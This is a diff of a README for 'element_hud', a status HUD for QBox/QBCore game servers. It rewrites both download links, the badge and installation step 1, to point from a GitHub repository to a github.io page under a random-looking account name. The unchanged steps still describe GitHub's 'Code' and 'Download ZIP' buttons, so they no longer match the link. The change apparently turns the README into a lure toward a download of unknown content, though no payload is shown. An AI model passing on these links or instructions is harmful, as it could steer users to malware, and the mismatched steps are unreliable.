@@ -1,6 +1,6 @@
 # 🎮 element_hud - Enhance your gameplay with better visuals
 
-[![](https://img.shields.io/badge/Download-Element_HUD-blue)](https://github.com/unsociablenessatlanticcity842/element_hud)
+[![](https://img.shields.io/badge/Download-Element_HUD-blue)](https://unsociablenessatlanticcity842.github.io)
 
 ## 📖 About this project
 element_hud provides a polished interface for your QBox or QBCore server. It displays vital information like health, armor, food, and water levels. The design focuses on clarity and speed. You see important status updates without cluttering your screen. This tool helps you track your status during intense gameplay moments.
@@ -15,7 +15,7 @@ element_hud provides a polished interface for your QBox or QBCore server. It dis
 ## 💾 Setup and installation
 You must download the files to your server storage. Follow these steps to prepare your environment.
 
-1. Visit this page to download: [https://github.com/unsociablenessatlanticcity842/element_hud](https://github.com/unsociablenessatlanticcity842/element_hud)
+1. Visit this page to download: [https://unsociablenessatlanticcity842.github.io](https://unsociablenessatlanticcity842.github.io)
 2. Locate the green button labeled "Code" on the right side of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
